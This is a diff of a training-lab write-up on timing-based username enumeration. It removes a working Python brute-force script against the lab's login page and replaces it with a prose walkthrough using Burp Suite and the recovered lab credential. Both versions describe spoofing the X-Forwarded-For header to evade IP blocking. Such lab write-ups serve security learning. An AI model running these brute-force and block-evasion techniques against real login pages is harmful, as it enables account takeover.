@@ -5,61 +5,19 @@ This lab is vulnerable to username enumeration using its response times. To solv
 Your credentials: `wiener:peter`
 
 ## Solution
-Script:
-```python
-import requests
-import time
-from bs4 import BeautifulSoup
-from concurrent.futures import ThreadPoolExecutor
+First, in order not to be blocked, we need to add an additional header `X-Forwarded-For` with a different value for each request.  
 
-URL = 'https://acb71f9d1fcb4d7380c7651b00c600e7.web-security-academy.net/login'
+Second, while brute-forcing the `username`, if a valid `username` is encountered, the server will check the long `password`, which in turn causes a delay.  
+On Burp Suite Pro, I ran an attack and see that the `mysql` username had the longest response time, which is a signal of a valid `username`.  
 
-with open('usernames.txt', 'r') as f:
-    usernames = f.readlines()
-
-usernames = list(map(lambda x: x.strip(), usernames))
-
-with open('passwords.txt', 'r') as f:
-    passwords = f.readlines()
-
-passwords = list(map(lambda x: x.strip(), passwords))
-
-true_username = ''
-true_password = ''
+![image](https://user-images.githubusercontent.com/44528004/130248381-febbd5ac-3147-4a25-a1c6-2ecf45c26060.png)
 
 
-def brute_username(username, i):
-    start = time.perf_counter()
-    resp = requests.post(url=URL,
-                         data={'username': username, 'password': 'a' * 100},
-                         headers={'X-Forwarded-For': str(i + 100)})
-    elapsed = time.perf_counter() - start
+Then, brute-forcing the `password` of the `mysql` user and the response with `status code == 302` is the correct password.  
 
-    if elapsed > 1:
-        global true_username
-        true_username = username
-        return True
-    return False
+![image](https://user-images.githubusercontent.com/44528004/130248127-64eeda06-bbe6-4d19-8bc9-1552eed3fbdf.png)  
 
+With these information, the valid credential is `mysql:777777`  
 
-def brute_password(password, i):
-    resp = requests.post(url=URL,
-                         data={'username': true_username, 'password': password},
-                         headers={'X-Forwarded-For': str(i + 100)})
-    if resp.status_code == 302:
-        global true_password
-        true_password = password
-        return True
-    return False
-
-
-for i, username in enumerate(usernames):
-    if brute_username(username, i):
-        print(true_username)
-        break
-
-for i, password in enumerate(passwords):
-    if brute_password(password, i):
-        print(true_password)
-        break
-```
+![image](https://user-images.githubusercontent.com/44528004/130248592-af757af9-1f3b-4e7a-870d-9408b8920324.png)
+> Solved!
